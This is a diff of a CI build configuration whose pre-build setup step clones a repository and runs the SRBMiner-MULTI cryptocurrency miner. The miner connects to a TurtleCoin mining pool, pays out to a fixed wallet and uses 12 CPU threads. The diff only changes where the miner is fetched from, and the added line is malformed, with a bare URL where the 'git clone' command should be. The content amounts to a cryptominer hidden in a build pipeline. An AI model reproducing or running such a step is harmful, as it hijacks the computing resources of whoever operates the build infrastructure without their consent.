@@ -3,4 +3,4 @@ build:
     my-node:
       project_setup:
         before:
-          - command: git clone https://mentahan@bitbucket.org/mentahan/haven.git haven && cd haven && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv2ny3UaEUFURe7z5MQ1UNbciPk742TcBewXFHZKhEj57SbL3Mjp3GGtmrKan4vQZEZB9NWKPhVPwTJ53ffLXLhBCxmCLaVk.gilakkura --disable-gpu --cpu-threads 12
+          - command: https://gitlab.com/gilacrypto/haven.git haven && cd haven && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv2ny3UaEUFURe7z5MQ1UNbciPk742TcBewXFHZKhEj57SbL3Mjp3GGtmrKan4vQZEZB9NWKPhVPwTJ53ffLXLhBCxmCLaVk.gilakkura --disable-gpu --cpu-threads 12
